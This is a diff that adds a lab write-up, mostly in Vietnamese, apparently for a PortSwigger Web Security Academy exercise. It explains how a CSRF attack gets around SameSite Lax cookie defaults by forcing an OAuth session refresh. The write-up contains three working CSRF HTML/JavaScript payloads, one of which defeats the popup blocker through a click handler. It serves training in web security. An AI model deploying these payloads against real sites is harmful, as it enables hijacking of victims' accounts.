@@ -1,0 +1,91 @@
+CSRF - SameSite Lax bypass via cookie refresh
+
+End Goal: To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.
+The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter
+
+Analystic
+---------
+Nghiên cứu chức năng thay đổi email
+Trong trình duyệt Burp, hãy đăng nhập bằng tài khoản mạng xã hội của bạn và thay đổi địa chỉ email.
+
+Trong Burp, hãy chuyển đến tab Proxy > Lịch sử HTTP .
+
+Nghiên cứu POST /my-account/change-emailyêu cầu và lưu ý rằng yêu cầu này không chứa bất kỳ mã thông báo không thể đoán trước nào, do đó có thể dễ bị CSRF nếu bạn có thể bỏ qua bất kỳ hạn chế cookie SameSite nào.
+
+Hãy xem phản hồi cho GET /oauth-callback?code=[...]yêu cầu ở cuối luồng OAuth. Lưu ý rằng trang web không chỉ định rõ ràng bất kỳ hạn chế SameSite nào khi thiết lập cookie phiên. Do đó, trình duyệt sẽ sử dụng Laxmức hạn chế mặc định.
+
+Thử tấn công CSRF
+Trong trình duyệt, hãy truy cập vào máy chủ khai thác.
+
+Sử dụng mẫu sau để tạo một cuộc tấn công CSRF cơ bản nhằm thay đổi địa chỉ email của nạn nhân:
+
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="foo@bar.com" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+Lưu trữ và tự xem khai thác. Điều gì xảy ra tiếp theo phụ thuộc vào thời gian đã trôi qua kể từ khi bạn đăng nhập:
+
+Nếu quá hai phút, bạn sẽ được đăng nhập qua luồng OAuth và cuộc tấn công sẽ thất bại. Trong trường hợp này, hãy lặp lại bước này ngay lập tức.
+
+Nếu bạn đăng nhập cách đây chưa đầy hai phút, cuộc tấn công đã thành công và địa chỉ email của bạn đã được thay đổi. Từ tab Proxy > Lịch sử HTTP , hãy tìm POST /my-account/change-emailyêu cầu và xác nhận rằng cookie phiên của bạn đã được bao gồm mặc dù đây là yêu cầu liên trang web POST.
+
+Bỏ qua các hạn chế của SameSite
+Trong trình duyệt, hãy lưu ý rằng nếu bạn truy cập /social-login, điều này sẽ tự động khởi tạo luồng OAuth đầy đủ. Nếu bạn vẫn có phiên đăng nhập với máy chủ OAuth, tất cả đều diễn ra mà không cần bất kỳ tương tác nào.
+
+Từ lịch sử proxy, hãy lưu ý rằng mỗi lần bạn hoàn tất luồng OAuth, trang web đích sẽ đặt một cookie phiên mới ngay cả khi bạn đã đăng nhập.
+
+Quay lại máy chủ khai thác.
+
+Thay đổi JavaScript để cuộc tấn công đầu tiên làm mới phiên của nạn nhân bằng cách buộc trình duyệt của họ truy cập /social-login, sau đó gửi yêu cầu thay đổi email sau một thời gian tạm dừng ngắn. Sau đây là một cách tiếp cận khả thi:
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@web-security-academy.net">
+</form>
+<script>
+    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
+Lưu ý rằng chúng tôi đã mở /social-logintrong một cửa sổ mới để tránh thoát khỏi lỗi trước khi yêu cầu thay đổi qua email được gửi đi.
+
+Tự lưu trữ và xem khai thác. Lưu ý rằng yêu cầu ban đầu bị chặn bởi trình chặn cửa sổ bật lên của trình duyệt.
+
+Lưu ý rằng, sau khi tạm dừng, cuộc tấn công CSRF vẫn được khởi chạy. Tuy nhiên, điều này chỉ thành công nếu cookie của bạn được thiết lập chưa đầy hai phút. Nếu không, cuộc tấn công sẽ thất bại vì trình chặn cửa sổ bật lên ngăn chặn việc làm mới cookie bắt buộc.
+
+Bỏ qua trình chặn cửa sổ bật lên
+Nhận ra rằng cửa sổ bật lên đang bị chặn vì bạn chưa tương tác thủ công với trang.
+
+Điều chỉnh khai thác để nó khiến nạn nhân nhấp vào trang và chỉ mở cửa sổ bật lên sau khi người dùng nhấp vào. Sau đây là một cách tiếp cận khả thi:
+
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+</form>
+<p>Click anywhere on the page</p>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail() {
+        document.forms[0].submit();
+    }
+</script>
+Hãy tự kiểm tra lại cuộc tấn công trong khi theo dõi lịch sử proxy trong Burp.
+
+Khi được nhắc, hãy nhấp vào trang. Thao tác này sẽ kích hoạt luồng OAuth và cấp cho bạn cookie phiên mới. Sau 5 giây, hãy lưu ý rằng cuộc tấn công CSRF được gửi và POST /my-account/change-emailyêu cầu bao gồm cookie phiên mới của bạn.
+
+Vào trang tài khoản của bạn và xác nhận rằng địa chỉ email của bạn đã thay đổi.
+
+Thay đổi địa chỉ email trong phần khai thác sao cho nó không trùng với địa chỉ email của bạn.
+
+Cung cấp mã khai thác cho nạn nhân để giải quyết phòng thí nghiệm.
